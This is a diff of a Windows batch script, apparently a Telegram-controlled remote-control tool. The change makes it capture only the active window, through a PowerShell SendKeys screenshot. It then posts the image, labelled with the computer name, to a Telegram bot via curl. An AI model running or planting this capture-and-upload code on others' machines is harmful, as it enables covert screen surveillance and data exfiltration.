@@ -103,15 +103,15 @@ goto command_loop
     :: Attesa caricamento pagina
     timeout /t 10 /nobreak >nul
     
-    :: Cattura screenshot
-    powershell -command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -Milliseconds 1000; $img=[Windows.Forms.Clipboard]::GetImage(); if($img){$img.Save('%SCREENSHOT_PATH%',[Drawing.Imaging.ImageFormat]::Png)}"
+    :: Cattura SOLO la finestra attiva (Alt+Stamp)
+    powershell -command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('%{PRTSC}'); Start-Sleep -Milliseconds 1000; $img=[Windows.Forms.Clipboard]::GetImage(); if($img){$img.Save('%SCREENSHOT_PATH%',[Drawing.Imaging.ImageFormat]::Png)}"
     
     :: Invia screenshot
     if exist "%SCREENSHOT_PATH%" (
         curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendPhoto" ^
             -F chat_id=%CHAT_ID% ^
             -F photo=@"%SCREENSHOT_PATH%" ^
-            -F caption="🖥️ %COMPUTERNAME%: Aperto URL !url_to_open!"
+            -F caption="🖥️ %COMPUTERNAME%: Finestra attiva - !url_to_open!"
         del "%SCREENSHOT_PATH%" >nul
     )
 goto :eof
